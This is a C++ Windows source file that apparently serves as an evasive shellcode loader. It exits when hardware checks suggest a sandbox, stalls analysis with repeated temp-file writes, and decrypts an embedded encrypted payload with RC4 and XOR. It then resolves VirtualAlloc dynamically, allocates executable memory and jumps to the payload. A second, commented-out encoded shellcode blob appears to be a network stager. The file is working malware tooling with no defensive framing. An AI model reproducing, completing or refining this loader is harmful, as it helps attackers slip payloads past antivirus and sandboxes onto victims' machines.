#include"UserDefineApi.h"
#include"antivm.h"
#include"delayexec.h"
#pragma comment (linker,"/entry:WinMain")


#define TMPFILE	L"demo.tmp"
 
#define SECTOSTRESS(i)( (int)i * 196 )


#ifndef APIHAMMERING_IN_BACKGROUND
#define APIHAMMERING_AS_DELAY
#endif // !APIHAMMERING_IN_BACKGROUND


typedef LPVOID(WINAPI* pfnVirtualAlloc)(_In_opt_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flAllocationType, _In_ DWORD flProtect);
BOOL ApiHammering(DWORD dwStress);

int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow) {
	
	if (VenvChecker::IsVenvByHardwareCheck()) {
		MessageBoxA(NULL, "sanbox check!", "sandbox", MB_OK);
		exit(EXIT_FAILURE);
	}
	
	//srand(unsigned int(__TIME__));
	//__alt_sleepms(SLEEPTIME * 12);
	
	/*
	if (!DelayExecutionVia_NtDE(0.5)) {
		printf("\n\t\t<<!>> DelayExecutionVia_NtDE FAILED <<!>>\n");
		exit(0);
	}
	//printf("-------------------------------------------------------------------\n");
	if (!DelayExecutionVia_NtWFSO(0.5)) {
		printf("\n\t\t<<!>> DelayExecutionVia_NtWFSO FAILED <<!>>\n");
		exit(0);
	}
	*/
	
	if (!ApiHammering(SECTOSTRESS(5))) {
		return -1;
	}

	//这里对shellcode做了RC4和异或
	unsigned char key[] = { 'c', 'a', 'i', 'g', 'o', 'u', '1', '1' };
	unsigned char shellcode[] = "1111111\x57\x7a\x6b\xd3\x9b\x55\x35\x0f\xbd\xdf\x29\x28\x76\xfe\xff\x3e\x78\xb7\xf2\xce\x14\x80\xac\xde\x9c\x26\x5c\xfc\x79\x50\x5a\x1a\xe9\x58\x5b\x6e\x2d\x26\x9b\x0e\x4d\xda\x9a\xec\x96\xc4\xd8\x8d\x15\xb6\xbb\x84\xdd\xbd\x9b\x7e\xa0\x0d\x83\x4a\x0b\xc2\xbd\xa1\xe8\x11\x55\xea\x62\x0d\x49\xd5\x6e\x15\x4a\xd3\x7e\x44\x66\xeb\x25\x0e\x96\xaa\x45\x54\x94\xa1\x35\x0d\x3d\xca\xb6\x1f\x0e\x04\xef\x07\xea\x34\x05\xd8\x2a\xea\x79\x44\xf0\xcb\xf0\x9e\x27\xb4\x11\x18\x39\x21\xeb\x12\x56\x02\x78\xe0\x83\x3a\x19\x4a\xdf\xad\xe3\x3b\x97\x98\xf2\xe9\x75\x16\xf2\xad\xb6\x1f\xee\x2f\xe7\xec\x8a\x82\x64\xea\xab\x10\x56\x7e\xc2\xff\x19\x58\x87\x69\xf8\xe4\x70\xcc\x04\x28\x9a\xa0\x13\x1a\x4d\x73\x20\x4e\xf7\x37\xac\x9e\xaa\x76\xbe\x93\xf1\x49\xc4\x88\xc7\xfb\x64\xcd\x2b\x7f\xec\xf8\x68\xaa\x4e\xd6\x10\xc4\xe9\x3e\x29\x9a\x66\x6e\xe6\x95\x6d\xaf\x61\xbd\x06\x25\xbc\xc1\xce\xb2\x5c\xbe\x57\x0f\x15\x4c\x2f\x41\xb6\x88\xf5\x27\xa0\xda\x64\xa8\x31\xcc\xbd\xba\xd9\x63\x68\x65\xea\x7f\xb2\x8a\xe3\xd7\x83\x30\x53\xc3\x3c\x11\x03\xf8\x8d\xef\x84\xb9\x01\x63\x59\x0e\x1b\xd8\x57\x5b\xcf\xfd\xa8\x30\x73\x6f\x8f\x31\xf6\x05\x78\x55\x90\x5e\x17\x43\x69\x85\xb8\xab\xee\xa1\xab\x79\xc6\x6d\x94\x20\x52\xd7\x60\xab\x50\xac\x29\xc2\x9c\x73\xfd\x17\x68\x86\x75\x38\xeb\xce\xdd\x24\x0f\x54\x38\x4a\x29\x89\x45\xa0\xdc\x39\x35\xba\xa2\x86\xcb\xd2\x93\xe7\x92\x6b\x60\x09\xb3\xbf\x6c\x0b\xe7\x42\x0b\xbb\x6a\x10\x27\x0e\x95\x87\xcf\x5a\x2f\x72\xbf\x45\x4a\xef\xc5\x10\x17\xa2\xd2\xa2\x69\x59\x76\xd9\x34\x87\xab\x95\x27\x4f\x35\x51\xec\xc3\x42\x73\x13\x01\x88\xba\x89\x76\xe1\xdc\xef\xd1\xd9\x74\x10\x25\x4c\x07\x2b\x6b\xfc\x94\x75\x64\xa1\x56\xfa\x3e\x12\x1e\x2d\x5a\xcc\x5a\x06\xc4\x48\x41\x96\xf7\x0d\xaa\xf9\x6c\xdf\xe8\xcb\xd5\x30\x26\xc7\x6a\x97\x8e\xb9\xef\xd5\xcf\x88\xca\xbb\xdc\x0b\xb7\xa6\x55\xca\xa4\x46\x6f\x22\x88\x69\x19\xc9\xb7\xb6\xcc\xd0\xf2\x3b\xee\x6e\x43\x39\x0a\xcf\xb3\x9a\x67\x5e\xb5\xc2\x72\xbe\x76\x7b\xe7\xac\xd8\xd7\x0f\x00\x1d\x1e\x4c\xd5\xe8\x12\x76\xd4\xbb\xe2\x10\xe3\x7b\xa4\x81\x87\xf3\x73\xf3\x30\xed\x54\x47\x50\xc5\xb6\x7a\x86\xfa\xff\xde\x3b\xd5\x00\x94\xcd\x42\x1a\x66\x72\xfd\xfa\x56\x00\x3f\xb8\x36\xff\x7d\x57\x21\x76\x2a\x11\x39\x73\x9c\x7e\x1d\xe5\x02\x36\x56\x06\xd1\x6c\x52\x7d\x1c\x22\xa9\x4f\x65\x65\x25\x24\x14\x21\xca\x9f\x05\x57\x71\x04\xf1\xef\xed\x30\x71\x07\x20\xaa\xc5\x2a\x48\xcb\x1b\xc5\xd0\xfd\xd3\x80\xf3\xe8\x1b\x30\xb6\x9e\x44\x77\x94\x27\x95\x58\x8b\xc8\x3c\xe0\x8f\xe6\x5b\xf3\xcc\x8f\x27\x0b\xa7\x49\x81\x97\xae\xee\x5b\xd2\x55\xf6\x81\x38\x20\xed\x9d\x23\x94\xff\x5c\xe6\xc7\x2f\x24\xea\x05\xd5\x6d\x43\x7e\x50\x9f\xcc\x2d\x69\xe0\x74\x5a\x62\xb6\xa1\xa3\xa4\xb5\x4c\xf8\xc3\x98\x0d\x3d\x9b\x5a\x76\xd3\x83\x7c\xce\xef\x2f\x60\x53\x22\x64\xe7\x85\x84\x62\x33\xee\x5d\x8f\xe1\x6f\x10\x12\x04\xd5\xf5\x57\x83\x24\x02\x92\x41\x19\xfd\x6f\x52\x7a\x5d\x11\x41\x99\x0d\xfe\xed\x2e\x42\x38\x62\xe0\xa0\x9f\xf2\xcb\x5a\x9d\x15\xd4\x8e\x0e\x36\x6a\xcd\xd6\xec\xac\x97\x44\xba\xc5\x9d\x6c\x45\x80\x7a\xdc\xb2\x2b\xa0\x5c\x15\x8f\x48\x91\x91\x41\xa6\x60\xa4\x41\x91\x95\xfe\xe1\xae\xe2\xa5\xe7\x2c\x96\x92\x5a\xe4\xda\x07\xb7\xc2\xaf\x79\xbf\x4e\xb2\xc5\x90\xe3\x52\xc8\x89\x2c\x45\x1a\x70\xf3\x2d\x84\xd3\x9b\x91\xf6\x00\xca\x85\x2c\x0b\xed\x42\x02\x58\x84\x86\xed\x87\xd4\x11\x9d\xa2\x13\x87\x51\x95\x53\xcb\x81\xf1\xf0\x8d\xf1\x0a\x85\x35\x78\x1a\x3c\x8d\x5f\xe1\x07\xc0\x11\xfc\x37\x99\x7e\x30\x73\x9f\xe4\x11\xc3\x3a\x4d\x73\x20\xdd\x9f\x4e\x3e\x44\xa8\xb8\x55\xdf\xf7\xa7\xc9\xd1\x9a\x95\x83\x7d\x73\x0a\xd5\xc8\x8f\xc3\x97\x26\x7c\x91\x41\x9f\x85\xac\x0c\x19\xcc\xfb\x17\xed\x75\xdc\x2b\x7b\x61\x3d\xed\x8d\xfb\xbc\xdd\xdf\xa9\xfd\x27\x85";
	//unsigned char shellcode[] = "\x37\x83\x48\x2f\x3b\x23\x03\xcb\xcb\xcb\x8a\x9a\x8a\x9b\x99\x9a\x9d\x83\xfa\x19\xae\x83\x40\x99\xab\x83\x40\x99\xd3\x83\x40\x99\xeb\x83\x40\xb9\x9b\x83\xc4\x7c\x81\x81\x86\xfa\x02\x83\xfa\x0b\x67\xf7\xaa\xb7\xc9\xe7\xeb\x8a\x0a\x02\xc6\x8a\xca\x0a\x29\x26\x99\x8a\x9a\x83\x40\x99\xeb\x40\x89\xf7\x83\xca\x1b\xad\x4a\xb3\xd3\xc0\xc9\xbe\xb9\x40\x4b\x43\xcb\xcb\xcb\x83\x4e\x0b\xbf\xac\x83\xca\x1b\x9b\x40\x83\xd3\x8f\x40\x8b\xeb\x82\xca\x1b\x28\x9d\x83\x34\x02\x8a\x40\xff\x43\x83\xca\x1d\x86\xfa\x02\x83\xfa\x0b\x67\x8a\x0a\x02\xc6\x8a\xca\x0a\xf3\x2b\xbe\x3a\x87\xc8\x87\xef\xc3\x8e\xf2\x1a\xbe\x13\x93\x8f\x40\x8b\xef\x82\xca\x1b\xad\x8a\x40\xc7\x83\x8f\x40\x8b\xd7\x82\xca\x1b\x8a\x40\xcf\x43\x83\xca\x1b\x8a\x93\x8a\x93\x95\x92\x91\x8a\x93\x8a\x92\x8a\x91\x83\x48\x27\xeb\x8a\x99\x34\x2b\x93\x8a\x92\x91\x83\x40\xd9\x22\x84\x34\x34\x34\x96\xa1\xcb\x82\x75\xbc\xa2\xa5\xa2\xa5\xae\xbf\xcb\x8a\x9d\x82\x42\x2d\x87\x42\x3a\x8a\x71\x87\xbc\xed\xcc\x34\x1e\x83\xfa\x02\x83\xfa\x19\x86\xfa\x0b\x86\xfa\x02\x8a\x9b\x8a\x9b\x8a\x71\xf1\x9d\xb2\x6c\x34\x1e\x20\xb8\x91\x83\x42\x0a\x8a\x73\x5b\xd4\xcb\xcb\x86\xfa\x02\x8a\x9a\x8a\x9a\xa1\xc8\x8a\x9a\x8a\x71\x9c\x42\x54\x0d\x34\x1e\x20\x92\x90\x83\x42\x0a\x83\xfa\x19\x82\x42\x13\x86\xfa\x02\x99\xa3\xcb\xc9\x8b\x4f\x99\x99\x8a\x71\x20\x9e\xe5\xf0\x34\x1e\x83\x42\x0d\x83\x48\x08\x9b\xa1\xc1\x94\x83\x42\x3a\x83\x42\x11\x82\x0c\x0b\x34\x34\x34\x34\x86\xfa\x02\x99\x99\x8a\x71\xe6\xcd\xd3\xb0\x34\x1e\x4e\x0b\xc4\x4e\x56\xca\xcb\xcb\x83\x34\x04\xc4\x4f\x47\xca\xcb\xcb\x20\x18\x22\x2f\xca\xcb\xcb\x23\x69\x34\x34\x34\xe4\xa5\xff\x9a\xa1\xcb\x3a\x0c\x8a\x5d\x18\xd8\x80\x63\x39\xac\x2c\xd7\xbf\x08\x10\xa4\x14\xc3\x02\xf3\x7c\x2b\xd3\x97\xc5\xbe\xc5\xa7\x7f\x23\x81\x2c\xcc\x0e\xd4\x52\x31\x7c\xbe\x27\xbe\x3c\x7e\x3c\x4c\x53\xcd\x37\x44\x65\x1c\x17\xea\x07\xc4\xbb\x47\x61\x5e\x6c\x53\x45\xc6\xc4\x06\x0e\x3d\xfc\x12\xab\x9c\xdc\x29\xcb\x9e\xb8\xae\xb9\xe6\x8a\xac\xae\xa5\xbf\xf1\xeb\x86\xa4\xb1\xa2\xa7\xa7\xaa\xe4\xfe\xe5\xfb\xeb\xe3\xa8\xa4\xa6\xbb\xaa\xbf\xa2\xa9\xa7\xae\xf0\xeb\x86\x98\x82\x8e\xeb\xf2\xe5\xfb\xf0\xeb\x9c\xa2\xa5\xaf\xa4\xbc\xb8\xeb\x85\x9f\xeb\xfd\xe5\xfa\xf0\xeb\x9c\x84\x9c\xfd\xff\xf0\xeb\x9f\xb9\xa2\xaf\xae\xa5\xbf\xe4\xfe\xe5\xfb\xe2\xc6\xc1\xcb\x5a\x89\x6a\x6a\x01\x04\x37\x80\xcb\xeb\x40\xa3\xff\x74\x70\x93\x57\x63\x27\x87\x70\x69\x2b\xee\x43\xb8\xce\x9a\xfb\x5f\x87\xbb\xe3\x29\x4b\x44\x4f\xad\x41\x90\xc6\xf8\xfe\xfd\xe1\xb7\x5a\xb5\xf5\xc0\xe4\xc8\xf0\xc1\xdb\x97\x7c\x2c\x44\x76\xce\x71\x3e\x51\x9e\xd0\x85\x49\xb3\xf4\x2d\x8f\x39\xac\xa5\xb6\x8f\xe3\x20\x44\x95\x9f\x9e\x52\xa1\xfa\x13\x1f\xcb\x81\x80\xde\x6f\x52\x1c\x2e\xd2\x7c\xc3\x30\xb8\x49\xae\x08\x29\x7c\x31\xf6\x71\xcf\x38\x22\x7f\x26\x9f\xb1\x05\x7c\x06\x8b\x08\x71\xfc\xc3\xd7\x54\x15\x9f\x65\x0d\x16\x45\x88\x0c\x7d\xf9\xfa\x45\x2b\x02\x7b\x64\x3e\x95\x0b\x39\xec\xfa\xeb\xea\x21\x8f\x0e\x10\x51\xd2\x24\x45\xbb\x75\xb8\x86\xb4\x16\x97\xe5\x26\x4d\x7c\xda\x15\x69\x32\x81\xc6\x49\xc5\xe7\x3f\x68\x09\xae\xdf\xc9\x66\x45\xa8\xc1\x48\x0b\xd2\xdc\x5c\x07\xe6\xba\x02\x65\xd0\xfe\xd8\x5e\x8a\x8d\xf7\xfd\x97\xe5\x23\xb4\xd0\xf5\x8b\xaf\x0d\xe2\x43\x3a\xcb\x8a\x75\x3b\x7e\x69\x9d\x34\x1e\x83\xfa\x02\x71\xcb\xcb\x8b\xcb\x8a\x73\xcb\xdb\xcb\xcb\x8a\x72\x8b\xcb\xcb\xcb\x8a\x71\x93\x6f\x98\x2e\x34\x1e\x83\x58\x98\x98\x83\x42\x2c\x83\x42\x3a\x83\x42\x11\x8a\x73\xcb\xeb\xcb\xcb\x82\x42\x32\x8a\x71\xd9\x5d\x42\x29\x34\x1e\x83\x48\x0f\xeb\x4e\x0b\xbf\x7d\xad\x40\xcc\x83\xca\x08\x4e\x0b\xbe\x1c\x93\x93\x93\x83\xce\xcb\xcb\xcb\xcb\x9b\x08\x23\x54\x36\x34\x34\xfa\xf2\xf9\xe5\xfa\xfd\xf3\xe5\xf8\xfa\xe5\xfa\xf9\xf3\xcb\xec\x77\x4d\x61";
	
	size_t originalLenth = sizeof(shellcode) - 1;
	memmove(shellcode, shellcode + 7, originalLenth-6);
	char first[] = "\x57";

	struct rc4_state* s;
	s = (struct rc4_state*)malloc(sizeof(struct rc4_state));

	rc4_setup(s, key, sizeof(key) - 1);

	rc4_crypt(s, shellcode, sizeof(shellcode) - 1);
	free(s);

	for (int i = 0;i<sizeof(shellcode);i++ ){
		shellcode[i] ^= 0xcb;
	}

	pfnVirtualAlloc fnVirtualAlloc = (pfnVirtualAlloc)MyGetProcAddress(MyGetModuleHandle(L"kernel32.dll"), "VirtualAlloc");

	LPVOID Memory = fnVirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(Memory, shellcode, sizeof(shellcode));
	((void(*)())Memory)();

}


BOOL ApiHammering(DWORD dwStress) {

	WCHAR		szPath[MAX_PATH * 2],
		szTmpPath[MAX_PATH];

	HANDLE		hRFile = INVALID_HANDLE_VALUE,
		hWFile = INVALID_HANDLE_VALUE;

	DWORD		dwNumberOfBytesRead = NULL,
		dwNumberOfBytesWritten = NULL;

	PBYTE		pRandBuffer = NULL;
	SIZE_T		sBufferSize = 0xFFFFF;	// 1048575 byte

	INT			Random = 0;

	// getting the tmp folder path
	if (!GetTempPathW(MAX_PATH, szTmpPath)) {
		printf("[!] GetTempPathW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// constructing the file path 
	wsprintfW(szPath, L"%s%s", szTmpPath, TMPFILE);

	for (SIZE_T i = 0; i < dwStress; i++) {

		// creating the file in write mode
		if ((hWFile = CreateFileW(szPath, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL)) == INVALID_HANDLE_VALUE) {
			printf("[!] CreateFileW Failed With Error : %d \n", GetLastError());
			return FALSE;
		}

		// allocating a buffer and filling it with a random value
		pRandBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBufferSize);
		Random = rand() % 0xFF;
		memset(pRandBuffer, Random, sBufferSize);

		// writing the random data into the file
		if (!WriteFile(hWFile, pRandBuffer, sBufferSize, &dwNumberOfBytesWritten, NULL) || dwNumberOfBytesWritten != sBufferSize) {
			printf("[!] WriteFile Failed With Error : %d \n", GetLastError());
			printf("[i] Written %d Bytes of %d \n", dwNumberOfBytesWritten, sBufferSize);
			return FALSE;
		}

		// clearing the buffer & closing the handle of the file
		RtlZeroMemory(pRandBuffer, sBufferSize);
		CloseHandle(hWFile);

		// opennig the file in read mode & delete when closed
		if ((hRFile = CreateFileW(szPath, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, NULL)) == INVALID_HANDLE_VALUE) {
			printf("[!] CreateFileW Failed With Error : %d \n", GetLastError());
			return FALSE;
		}

		// reading the random data written before 	
		if (!ReadFile(hRFile, pRandBuffer, sBufferSize, &dwNumberOfBytesRead, NULL) || dwNumberOfBytesRead != sBufferSize) {
			printf("[!] ReadFile Failed With Error : %d \n", GetLastError());
			printf("[i] Read %d Bytes of %d \n", dwNumberOfBytesRead, sBufferSize);
			return FALSE;
		}

		// clearing the buffer & freeing it
		RtlZeroMemory(pRandBuffer, sBufferSize);
		HeapFree(GetProcessHeap(), NULL, pRandBuffer);

		// closing the handle of the file - deleting it
		CloseHandle(hRFile);
	}


	return TRUE;
}
